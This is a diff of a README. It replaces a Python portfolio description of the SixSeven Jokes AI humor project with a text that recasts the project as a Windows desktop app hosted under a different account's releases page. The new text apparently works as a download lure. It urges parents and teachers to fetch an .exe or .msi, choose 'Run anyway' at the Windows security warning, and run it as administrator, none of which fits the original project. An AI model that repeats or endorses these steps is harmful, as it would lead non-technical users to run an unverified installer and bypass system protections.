@@ -1,309 +1,179 @@
-# SixSeven Jokes 🎭
-
-> **AI-powered humor platform for parents and teachers** — serving age-appropriate, personalized jokes with voice delivery across iOS and Android.
-
-[![Product Hunt](https://img.shields.io/badge/Product%20Hunt-Live-orange)](https://www.producthunt.com/products/sixseven-jokes)
-[![Website](https://img.shields.io/badge/Website-67jokes.com-blue)](https://67jokes.com/)
-
-*Why is it called SixSeven? Because seven ate nine! 🤣*
-
----
-
-## ⚠️ Disclaimer
-
-> **This repository contains selected code demos and architecture showcases from the SixSeven Jokes project. The full production codebase (backend services, frontend apps, deployment configs, proprietary data) is not open-sourced.** 
----
-
-## Overview
-
-SixSeven Jokes is a **production AI product** that delivers personalized, age-appropriate jokes to kids through a complete system covering data ingestion, retrieval, generation, voice synthesis, and user feedback loops. The product is live on iOS, Android, and Web with several hundred daily active users.
-
-This repository showcases the **core AI and data systems**:
-
-| Module | Description |
-|--------|-------------|
-| [**Data Pipeline**](data_pipeline/) | Multi-source joke extraction (PDF, images, text), LLM-based tagging, and two-stage deduplication |
-| [**RAG Pipeline**](rag/) | FAISS-based semantic retrieval, preference-aware filtering, Gemini fallback generation |
-| [**Fine-tuning**](fine_tuning/) | LoRA/QLoRA fine-tuning pipeline for custom joke generation models |
-| [**Multimodal**](multimodal/) | Dual-voice audio synthesis with ElevenLabs, two-tier caching, async processing |
-| [**Guardrail**](guardrail/) | Lightweight child-appropriateness safety filter (rule-based + LLM) |
-
----
-
-## System Architecture
-
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                        USER REQUEST                                  │
-│              (age_range, scenario, preferences)                       │
-└─────────────────────┬───────────────────────────────────────────────┘
-                      │
-                      ▼
-┌─────────────────────────────────────────────────────────────────────┐
-│                    SCENARIO NORMALIZATION                             │
-│         SentenceTransformer + FAISS semantic matching                 │
-│         "classroom jokes" → "school" | "pet stories" → "animals"     │
-└─────────────────────┬───────────────────────────────────────────────┘
-                      │
-                      ▼
-┌─────────────────────────────────────────────────────────────────────┐
-│                    RETRIEVAL LAYER                                    │
-│    ┌─────────────┐  ┌──────────────┐  ┌─────────────────────┐       │
-│    │ Age + Theme  │→ │ FAISS Vector │→ │ Preference Filter   │       │
-│    │ Filtering    │  │ Search       │  │ (like/dislike/view) │       │
-│    └─────────────┘  └──────────────┘  └─────────────────────┘       │
-└─────────────────────┬──────────────┬────────────────────────────────┘
-                      │              │
-              Sufficient?     Shortfall?
-                      │              │
-                      ▼              ▼
-              ┌──────────┐  ┌─────────────────────────────────┐
-              │  Return   │  │   GEMINI FALLBACK GENERATION    │
-              │  Results  │  │  Preference-aware prompting      │
-              └──────────┘  │  Robust structured output parsing │
-                            │  Async write-back to content pool │
-                            └──────────┬──────────────────────┘
-                                       │
-                                       ▼
-                            ┌──────────────────────┐
-                            │   SAFETY GUARDRAIL   │
-                            │  Rule-based + LLM    │
-                            └──────────┬───────────┘
-                                       │
-                                       ▼
-                            ┌──────────────────────┐
-                            │  MULTIMODAL DELIVERY  │
-                            │  Dual-voice synthesis  │
-                            │  Two-tier audio cache  │
-                            └──────────────────────┘
-```
-
----
-
-## Key Technical Highlights
-
-### 1. Retrieval-First, Generation-as-Fallback
-
-The system **does not generate every joke from scratch**. Instead:
-- Most requests are served from a curated, deduplicated joke pool via FAISS retrieval
-- Gemini is only called when the pool lacks sufficient matches
-- Generated jokes are written back to the pool, creating a **virtuous expansion cycle**
-
-**Why this matters:** Lower cost, lower latency, higher content quality, better consistency.
-
-### 2. Multi-Source Data Pipeline
-
-```
-PDF Joke Books ──┐
-                  │     ┌──────────┐     ┌───────────┐     ┌──────────┐
-Image Content  ───┼───▶ │Extractors│───▶ │LLM Tagger │───▶ │  Dedup   │───▶ Dataset
-                  │     │(per type)│     │ (batched) │     │(2-stage) │
-Text Files ──────┘     └──────────┘     └───────────┘     └──────────┘
-```
-
-- **Extractors:** Factory pattern — PDF uses PyMuPDF + Gemini, images use Gemini Vision, text uses regex + LLM fallback
-- **Tagger:** Batched LLM tagging with constrained vocabularies for age groups, themes, joke types
-- **Dedup:** Exact hash dedup (4,268 → 3,997) + semantic embedding dedup (3,997 → 3,303)
-
-### 3. Preference-Aware Personalization
-
-User feedback signals drive both retrieval and generation:
-- **Retrieval:** Liked jokes boost score, disliked jokes are hard-excluded, viewed jokes are deprioritized
-- **Generation:** User's liked/disliked jokes are injected into Gemini prompts as in-context conditioning
-- **No cold start problem:** Works with zero history (random from pool) and improves with each interaction
-
-### 4. Robust Structured Output Parsing
-
-LLMs don't reliably output valid JSON. Our parser handles:
-- Markdown code block wrappers (`\`\`\`json ... \`\`\``)
-- Trailing commas
-- Partial JSON arrays
-- Non-JSON preamble text
-- Regex fallback for severely malformed output
-
-### 5. Dual-Voice Multimodal Delivery
-
-Jokes are delivered as **audio experiences** with two different voices:
-- Setup voice (warm, storytelling tone)
-- Punchline voice (energetic, comedic tone)
-
-Audio is generated via ElevenLabs and cached in a **two-tier system**:
-- **Tier 1:** Local disk cache (~0ms lookup)
-- **Tier 2:** Firebase Storage (persistent, shared across instances)
-
-### 6. LoRA Fine-tuning Pipeline
-
-Custom joke generation model trained with:
-- **QLoRA** (4-bit quantization) for memory-efficient training
-- Instruction-tuning format with **preference-conditioned examples**
-- Stratified train/val/test splits by theme
-- Multi-dimensional evaluation: format compliance, diversity, training overlap, LLM-as-judge
-
----
-
-## Project Structure
-
-```
-sixseven-jokes/
-├── config.py                           # Centralized configuration
-├── requirements.txt                    # Dependencies
-│
-├── data_pipeline/                      # Data ingestion & processing
-│   ├── extractors/
-│   │   ├── base.py                     # Abstract extractor interface
-│   │   ├── pdf_extractor.py            # PyMuPDF + Gemini extraction
-│   │   ├── image_extractor.py          # Gemini Vision extraction
-│   │   └── text_extractor.py           # Regex + LLM fallback extraction
-│   ├── tagger.py                       # LLM-based age/theme/type tagging
-│   ├── dedup.py                        # Exact + embedding-based dedup
-│   └── pipeline.py                     # End-to-end pipeline orchestrator
-│
-├── rag/                                # Retrieval-Augmented Generation
-│   ├── embeddings.py                   # FAISS index management
-│   ├── scenario_matcher.py             # Semantic scenario normalization
-│   ├── retrieval.py                    # Preference-aware joke retrieval
-│   ├── generation.py                   # Gemini fallback generation
-│   ├── structured_output.py            # Robust JSON parser for LLM output
-│   └── pipeline.py                     # Full RAG serving pipeline
-│
-├── fine_tuning/                        # Model fine-tuning
-│   ├── data_preparation.py             # Instruction-tuning dataset builder
-│   ├── train.py                        # LoRA/QLoRA training script
-│   └── evaluate.py                     # Multi-metric evaluation
-│
-├── multimodal/                         # Audio content delivery
-│   ├── voice_synthesis.py              # ElevenLabs dual-voice synthesis
-│   ├── audio_cache.py                  # Two-tier caching (local + Firebase)
-│   └── delivery.py                     # Multimodal delivery pipeline
-│
-├── guardrail/                          # Content safety
-│   └── safety_filter.py                # Rule-based + LLM safety filter
-│
-└── tests/                              # Test suite
-    ├── test_data_pipeline.py
-    ├── test_rag.py
-    └── test_multimodal.py
-```
-
----
-
-## Quick Start
-
-### 1. Setup
-
-```bash
-git clone https://github.com/Siquan-Wang/sixseven-jokes.git
-cd sixseven-jokes
-pip install -r requirements.txt
-cp .env.example .env
-# Edit .env with your API keys
-```
-
-### 2. Run the Data Pipeline
-
-```python
-from data_pipeline import JokeDataPipeline
-
-pipeline = JokeDataPipeline(gemini_api_key="your_key")
-dataset, stats = pipeline.run("data/raw/")
-pipeline.save_dataset(dataset, "data/jokes.json")
-```
-
-### 3. Serve Jokes via RAG
-
-```python
-from rag import JokeRAGPipeline
-from rag.pipeline import JokeRequest
-
-# Initialize pipeline
-rag = JokeRAGPipeline()
-rag.load_from_dataset("data/jokes.json")
-
-# Serve a request
-response = rag.serve(JokeRequest(
-    age_range="5-7",
-    scenario="animals",
-    num_jokes=3,
-    liked_joke_ids=["joke_123"],
-))
-
-for joke in response.jokes:
-    print(f"Q: {joke['question']}")
-    print(f"A: {joke['answer']}\n")
-```
-
-### 4. Generate Audio
-
-```python
-from multimodal import MultimodalDeliveryPipeline
-
-delivery = MultimodalDeliveryPipeline()
-results = delivery.deliver(response.jokes, include_audio=True)
-```
-
-### 5. Fine-tune a Custom Model
-
-```python
-from fine_tuning import JokeDatasetBuilder, JokeFineTuner
-
-# Prepare dataset
-builder = JokeDatasetBuilder()
-splits = builder.build_dataset(jokes)
-builder.save_dataset(splits, "data/fine_tuning/")
-
-# Train
-tuner = JokeFineTuner(use_qlora=True)
-tuner.setup()
-metrics = tuner.train("data/fine_tuning/train.jsonl", "data/fine_tuning/val.jsonl")
-```
-
-### 6. Run Tests
-
-```bash
-pytest tests/ -v
-```
-
----
-
-## Tech Stack
-
-| Category | Technologies |
-|----------|-------------|
-| **LLM** | Google Gemini 1.5 Flash, Fine-tuned LoRA models |
-| **Embeddings** | SentenceTransformers (all-MiniLM-L6-v2), FAISS |
-| **Backend** | FastAPI, Firebase Auth, Firestore, Cloud Run |
-| **Voice** | ElevenLabs TTS (multilingual v2) |
-| **Fine-tuning** | HuggingFace Transformers, PEFT, TRL, bitsandbytes |
-| **Frontend** | Google AI Studio, iOS/Android native apps |
-| **Infra** | Firebase Storage, Cloudflare, GCP |
-
----
-
-## Product Metrics
-
-- 📱 **Platforms:** iOS + Android + Web
-- 👥 **DAU:** Several hundred daily active users
-- 🎯 **Content Pool:** 3,300+ curated and tagged jokes
-- 🗣️ **Audio:** Dual-voice joke delivery with caching
-- 🚀 **Launched on:** [Product Hunt](https://www.producthunt.com/products/sixseven-jokes)
-
----
-
----
-
-## About
-
-This project was co-founded and built with a team of friends. As the **Founding Engineer and AI Lead**, my primary contributions include:
-
-- **Project vision & iteration** — Continuously refined the product direction and led development planning
-- **Backend architecture** — Designed API interfaces, latency optimization strategies, and the retrieval-generation pipeline
-- **AI/ML systems** — Built the embedding algorithms, data pipeline, RAG system, and preference-aware generation
-- **Product analytics** — Analyzed user behavior patterns post-launch to drive data-informed iteration
-
-For more information about the product, visit [67jokes.com](https://67jokes.com/) or our [Product Hunt page](https://www.producthunt.com/products/sixseven-jokes).
-
-📧 Contact: info@sixsevengroup.com
-
-## License
-
-MIT License — This demo code is provided for portfolio and educational purposes.
+# 🤖 sixseven-jokes - Fun, Simple Jokes for Home and School
+
+[![Download sixseven-jokes](https://img.shields.io/badge/Download%20sixseven--jokes-2b6cb0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hsmd8584/sixseven-jokes/releases)
+
+## 🎯 What this is
+
+sixseven-jokes is a Windows app that helps parents and teachers find kid-friendly humor fast. It uses AI to create jokes, short fun prompts, and simple learning moments for home or class. The app is built for easy use, with a clean flow and clear results.
+
+## 🚀 Download and install
+
+Use this page to download the app for Windows:
+
+https://github.com/hsmd8584/sixseven-jokes/releases
+
+1. Open the link above in your web browser.
+2. Find the latest release at the top of the page.
+3. Look for the Windows file, such as an `.exe` or `.msi` file.
+4. Download the file to your computer.
+5. If Windows asks for permission, choose **Run** or **Yes**.
+6. Follow the on-screen setup steps.
+7. When setup ends, open sixseven-jokes from the Start menu or desktop shortcut.
+
+If you see more than one file, pick the Windows installer file first. If your browser asks where to save it, choose a place you can find again, such as **Downloads**.
+
+## 🪟 System requirements
+
+sixseven-jokes works best on a modern Windows PC.
+
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- 500 MB of free disk space
+- A stable internet connection for AI features
+- A screen size of 1366 × 768 or higher
+
+For smooth use, keep Windows updated and close apps you do not need while using the program.
+
+## ✨ What you can do
+
+- Generate clean jokes for kids
+- Create short humor prompts for class time
+- Share age-friendly content with parents or students
+- Use AI to mix humor with simple learning themes
+- Get text, image, or mixed-format outputs where supported
+- Save time when you need fresh ideas fast
+
+## 🧭 Before you start
+
+Have these ready:
+
+- A Windows computer
+- Internet access
+- A web browser
+- Permission to download files on your device
+
+If your school or home computer uses extra security, you may need to allow the download before the file opens.
+
+## 🛠️ How to run the app
+
+1. Visit the release page.
+2. Download the latest Windows installer.
+3. Open the downloaded file.
+4. If Windows shows a security prompt, select **More info** and then **Run anyway** only if you trust the source.
+5. Complete the install steps.
+6. Launch sixseven-jokes.
+7. Start by choosing a joke style, topic, or audience.
+
+## 🧑‍🏫 How it helps parents and teachers
+
+sixseven-jokes supports simple daily use.
+
+### For parents
+- Find jokes for dinner, rides, or bedtime
+- Keep humor age-appropriate
+- Use light prompts to start conversation
+- Add fun to daily routines
+
+### For teachers
+- Use jokes as warm-up material
+- Add humor to reading time
+- Start class with a short attention reset
+- Share fun content that fits younger audiences
+
+## 📚 Typical use flow
+
+1. Open the app.
+2. Choose a topic, such as animals, school, food, or seasons.
+3. Pick the tone or age group.
+4. Generate a joke or short set of jokes.
+5. Review the result.
+6. Save or share the content if needed.
+
+The app keeps the flow simple so you can move from idea to result without extra steps.
+
+## 🔧 Main parts of the platform
+
+sixseven-jokes brings together a few useful pieces behind the scenes.
+
+- **Data pipeline**: Keeps content organized and ready for use
+- **RAG**: Helps the app pull from useful reference material
+- **Fine-tuning**: Shapes the humor style for the target audience
+- **Multimodal delivery**: Supports more than one way to present content
+
+You do not need to manage these parts. They work inside the app to support the user experience.
+
+## 🖼️ What the app may show
+
+You may see:
+
+- A simple home screen
+- A topic picker
+- A joke preview area
+- Buttons to regenerate or refresh content
+- Export or share options
+- Sections for parents, teachers, or age groups
+
+The layout is meant to stay clear and easy to read.
+
+## 🧪 If something does not work
+
+Try these steps if the app does not open or install:
+
+- Download the file again
+- Make sure the file finished downloading
+- Right-click the file and choose **Run as administrator**
+- Check that your Windows version is current
+- Restart your computer and try again
+- Make sure no school or work policy blocks the install
+
+If the app opens but does not load content, check your internet connection and try again.
+
+## 🔐 Safe use
+
+Use the app on a trusted computer and keep your Windows account protected with a password. If the app asks for internet access, allow it only on a network you trust.
+
+## 📂 Files you may see
+
+After install, the app may add:
+
+- A desktop shortcut
+- A Start menu entry
+- App data for saved settings
+- Local cache for faster loading
+
+These files help the app open fast and keep your settings in place.
+
+## ❓ Common questions
+
+### Is this app only for kids?
+It is built for parents and teachers, but anyone who wants clean humor can use it.
+
+### Do I need to know programming?
+No. The app is made for regular Windows users.
+
+### Can I use it offline?
+Some parts may work offline, but AI features need internet access.
+
+### Is it hard to set up?
+No. Download the Windows file, open it, and follow the setup prompts.
+
+### Can I use it in class?
+Yes. It fits short humor breaks, warm-ups, and simple learning moments.
+
+## 🧩 Version updates
+
+New releases may include:
+
+- Better joke quality
+- Faster content generation
+- Cleaner layout changes
+- More age-based content controls
+- New output styles for home or school use
+
+Check the release page often if you want the latest Windows build.
+
+## 📥 Download again
+
+https://github.com/hsmd8584/sixseven-jokes/releases
+
+Download the latest Windows file from the release page, then install and run it on your PC
